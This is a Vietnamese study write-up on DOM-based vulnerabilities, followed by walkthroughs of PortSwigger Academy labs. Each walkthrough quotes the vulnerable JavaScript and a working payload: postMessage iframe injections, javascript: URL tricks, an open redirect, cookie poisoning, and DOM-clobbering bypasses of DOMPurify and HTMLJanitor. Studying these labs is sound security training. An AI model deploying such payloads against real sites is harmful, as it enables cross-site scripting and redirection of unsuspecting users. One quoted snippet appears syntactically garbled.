# DOM-based vulnerabilities

## What is DOM-based vulnerabilities ?

DOM viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. 
Mô hình này thể hiện tài liệu dưới dạng cấu trúc cây phân cấp. Tất cả các thành phần trong HTML, XML đều được xem như một node. DOM Based XSS là kỹ thuật khai 
thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML.
*Taint-flow vulnerabilities*: Nhiều lỗ hổng dựa trên DOM có thể bắt nguồn từ các vấn đề với cách mã phía máy khách thao túng dữ liệu có thể kiểm soát của kẻ tấn công.


## Controlling the web message source


### Exploit ?? Window.postMessage

Thì window.postMessage là một cách để các site có thể Cross-Origin giữa các Windows objects một cách an toàn (nếu được thực hiện đúng), 
phá bỏ hạn chế của SOP đã được đề cập ở trên một cách có kiểm soát.


postMessage có 2 thành phần chính, đó là:

  + window.postMessage() — Để gửi message
  
  + window.addEventListener(“message”,callback) — để nhận và xử lý message

Syntax chung của postMessage như sau:
```
targetWindow.postMessage(message, targetOrigin, [transfer]);

  + Tham số [transfer] là optional
  + Tham số targetWindow : Reference tới một windows hoặc iframe nào đó mà bạn muốn gửi message
  + Tham số message : Dữ liệu cần gửi đến targetOrigin, có thể là String hoặc JSON Object
  + Tham số targetOrigin Là phần cực kỳ quan trọng, chính là URL của trang nhận message. Tại thời điểm gửi đi (postMessage), 
nếu targetOrigin không khớp với hostname của targetWindow’s page, message sẽ không được gửi đi. Nếu chỉ định * sẽ khiến nó khớp với mọi URL,
tuy nhiên không được khuyến khích bởi lý do bảo mật.
```
## What is DOM-based open redirection?

DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation. For example, the following code is vulnerable due to the unsafe way it handles the location.hash property:

let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}

An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause a redirection to an arbitrary external domain.

## Prevent DOM-based vulnerabilities

Thật ra bạn không thể tránh hoàn toàn được DOM-based attack. Tuy nhiên, cách hiệu quả nhất để tránh các lỗ hổng dựa trên DOM là tránh cho phép dữ liệu từ bất kỳ 
nguồn không đáng tin cậy nào tự động thay đổi giá trị được truyền đến bất kỳ bộ lưu nào.


## DOM-based Vulnerabilities
### Lab: DOM XSS using web messages

Bài lab mô tả một lỗ hổng thông báo web đơn giản. Để giải quyết lab, hãy sử dụng máy chủ khai thác để đăng thông báo đến trang đích khiến hàm print () được gọi.

Truy cập vào bài lab chúng ta thấy được 1 website bán hàng như sau, vì mô tả bài lab là lỗ hổng thông báo web nên chúng ta sẽ kiểm tra source của web như sau:



Chúng ta phát hiện ra 1 đoạn Javascript như sau:
```
window.addEventListener('message', function(e) {
                            document.getElementById('ads').innerHTML = e.data;
                        })
```
Vì đã sử dụng hàm [innerHTML](https://medium.com/@gregadiaz89/dom-innerhtml-vulnerability-8821a03ef2b8) nên dẫn đến việc chúng ta có thể khai thác lỗ hổng này bằng 
1 payload Javascript xây dựng trên khung iframe như sau:

```
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

Khi iframe tải, phương thức [postMessage](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source) sẽ gửi một thông báo web đến trang chủ. Trình xử lý sự kiện, nhằm phân phát quảng cáo, lấy nội dung của thông điệp web và chèn nó vào
div với quảng cáo ID. Tuy nhiên, nó sẽ chèn thẻ img của chúng ta, thẻ này chứa thuộc tính src không hợp lệ. Điều này tạo ra một lỗi khiến trình xử lý sự kiện
onerror thực thi payload là hàm print().

Và chúng ta đã solve bài lab

### Lab: DOM XSS using web messages and a JavaScript URL

Bài lab này yêu cầu chứng minh một lỗ hổng DOM-based redirection được kích hoạt bởi tin nhắn web. Để giải quyết lab này, 
hãy xây dựng một trang HTML trên máy chủ khai thác khai thác lỗ hổng này và gọi hàm print ().

Truy cập trang bài lab chúng ta thấy 1 blog như sau:



Kiểm tra source code của website để xác định lỗ hổng DOM :
```
window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
```
Chúng ta có thể khai thác dựa vào hàm addEventListener() 

Payload:
```
<iframe src="https://ac7c1f8a1ea066a28036463100a80023.web-security-academy.net/" 
onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

Tập lệnh này sẽ gửi một thông báo web có chứa payload JavaScript tùy ý, cùng với chuỗi "http:". Đối số thứ hai chỉ định rằng mọi targetOrigin đều được phép cho thông báo web.

Khi iframe tải, phương thức postMessage () sẽ gửi tải trọng JavaScript đến trang chính. 
Trình xử lý sự kiện phát hiện chuỗi "http:" và tiến hành gửi payload đến location.href, nơi hàm print () được gọi. 
Và chúng ta hoàn thành bài lab theo yêu cầu là gọi hàm print()



### Lab: DOM XSS using web messages and JSON.parse

Bài lab này mô tả rằng sử dụng tin nhắn web và phân tích cú pháp tin nhắn dưới dạng JSON. Để giải quyết lab, hãy xây dựng một trang HTML 
trên máy chủ khai thác khai thác lỗ hổng này và gọi hàm print ().

```
window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
```
addEventListener() này nhận một chuỗi được phân tích cú pháp bằng JSON.parse (). Trong JavaScript, chúng ta có thể 
thấy rằng trình xử lý sự kiện mong đợi một thuộc tính và trường hợp load-channel của câu lệnh switch 
sẽ thay đổi thuộc tính iframe src. 
 Chúng ta có thể xây dưng payload dựa trên khung iframe sau : 
```
<iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{
\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

Chúng ta truy cập vào Exploit Server để Store đoạn payload lên và trở thành 1 phần của website 
sau đó Deliver to Victim để gửi đến website mà chúng ta muốn exploit

Khi iframe được load, phương thức postMessage () sẽ gửi một thông báo web đến trang chủ website với load-channel.
The event listener nhận được thông báo và phân tích cú pháp nó bằng cách sử dụng JSON.parse ()
trước khi gửi nó đến switch.

Switch kích hoạt trường hợp load-channel, gán thuộc tính url của thông báo cho thuộc tính src của 
iframe ACMEplayer.element. Trong trường hợp này, thuộc tính url của thư thực sự chứa 
payload JavaScript mà chúng ta đã tạo

Vì đối số thứ hai chỉ định rằng bất kỳ targetOrigin nào đều được phép cho thông báo web và trình 
xử lý sự kiện không chứa bất kỳ hình thức kiểm tra nguồn gốc nào,payload được đặt làm src của 
iframe ACMEplayer.element. Hàm print () được gọi khi nạn nhân load website. 



### Lab: DOM-based open redirection

Bài lab mô tả rằng blog này có chứa DOM-based open-redirection(lỗ hổng chuyển hướng), và dể khai thác thành công thì hãy chuyển hướng về server exploit.

Chúng ta kiểm tra source code và phát hiện đây chính là lỗi mà lab nhắc đến

```
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); 
if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```

Chức năng của đoạn code này là khi chúng ta truy cập 1 bài viết nào sẽ có đường link dẫn chúng ta quay về trang chủ bằng biến url 
Điều đó làm chúng ta có payload sau:
```
https://ac9e1f1e1e10941180196da900770014.web-security-academy.net/postId=4&
url=https://exploit-ac5f1f7c1ea294d180d16d44012300af.web-security-academy.net/
```
Khi load đường link này chúng ta có thể hoàn thành bài lab.


### Lab: DOM-based cookie manipulation

This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a 
different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.

Bài lab mô tả rằng lỗi thao tác DOM-based client-side cookie này có trên web. Để hoàn thành bài lab, chúng ta phải inject 1 cookie sẽ gây ra XSS trên một trang khác và gọi hàm print ().
Và chúng ta cần sự hỗ trợ của của exploit server.

```
document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
```
Dựa vào đoạn source code trên chúng ta nhận thấy trang web phản ánh các giá trị từ lastViewedProduct mà không mã hóa HTML một cách không an toàn, kẻ tấn công có thể sử dụng các kỹ thuật thao túng lastViewedProduct để exploit lỗ hổng này.

```
<iframe src="https://your-lab-id.web-security-academy.net/product?productId=1&'><script>print()</script>"
onload="if(!window.x)this.src='https://your-lab-id.web-security-academy.net';window.x=1;">
``` 

Nguồn ban đầu của iframe khớp với URL của một trong các trang sản phẩm, ngoại trừ có một payload JavaScript được thêm vào cuối. Khi iframe load lần đầu tiên, trình duyệt tạm thời mở URL độc hại, URL này sau đó được lưu dưới dạng giá trị của cookie lastViewedProduct. Trang web vẫn chạy bình thường mà không biết việc gán cookie được diễn ra. Trong khi trình duyệt của nạn nhân đã lưu cookie bị nhiễm độc, việc load website sẽ chạy payload được exploit.



### Lab: Exploiting DOM clobbering to enable XSS 

Bài lab đã mô tả rằng website tồn tại lỗ hổng DOM-clobbering và chức năng comment của website cho phép comment HTML "an toàn". Để hoàn thành lab, chúng ta phải injection HTML vào để kích hoạt XSS.



```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(Hacker)//">
```

Source: 

```
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
```

defaultAvatar được triển khai bằng cách sử dụng mẫu nguy hiểm này có chứa toán tử OR logic kết hợp với một biến toàn cục. Điều này dẫn đến lỗ hổng DOM-clobbering


Website sử dụng bộ lọc DOMPurify để cố gắng giảm các lỗ hổng dựa trên DOM. Tuy nhiên, DOMPurify cho phép bạn sử dụng giao thức cid:, không mã hóa URL trong dấu ngoặc kép. Điều này có nghĩa là bạn có thể đưa vào một dấu ngoặc kép được mã hóa sẽ được giải mã trong thời gian chạy. Do đó, việc chèn được mô tả ở trên sẽ khiến biến defaultAvatar được gán thuộc tính clobbered {avatar: ‘cid:"onerror=alert(1)//’} vào lần cmt tiếp theo.

Điều đó có nghĩa là khi chúng ta commment lần thứ 2 thì payload sẽ được kích hoạt.


### Lab: Clobbering DOM attributes to bypass HTML filters

Lab này sử dụng thư viện HTMLJanitor, thư viện dễ bị tấn công bởi DOM-clobbering. Để giải quyết bài lab, hãy xây dựng một vectơ bỏ qua bộ lọc và sử dụng chức năng chặn DOM-clobbering để đưa vào một vectơ gọi hàm print (). Bạn có thể cần sử dụng máy chủ khai thác để làm cho vectơ của bạn tự động thực thi trong trình duyệt của nạn nhân.

Comment payload: 
```
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```


Exploit server:
```
<iframe src=https://your-lab-id.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```



Thư viện sử dụng thuộc tính attributes  để lọc các thuộc tính HTML. Tuy nhiên, nó vẫn có thể che lấp bản thân thuộc tính attributes , khiến độ dài không được xác định. Điều này cho phép chúng tôi đưa bất kỳ thuộc tính nào chúng tôi muốn vào phần tử biểu mẫu. Trong trường hợp này, chúng tôi sử dụng thuộc tính onfocus để nhập lậu hàm print ().

Khi iframe được tải, sau độ trễ 500ms, iframe sẽ thêm đoạn #x vào cuối URL trang. Sự chậm trễ là cần thiết để đảm bảo rằng chú thích chứa nội dung chèn được tải trước khi JavaScript được thực thi. Điều này khiến trình duyệt tập trung vào phần tử có ID "x", là biểu mẫu chúng tôi đã tạo bên trong nhận xét. Sau đó, trình xử lý sự kiện onfocus gọi hàm print ()
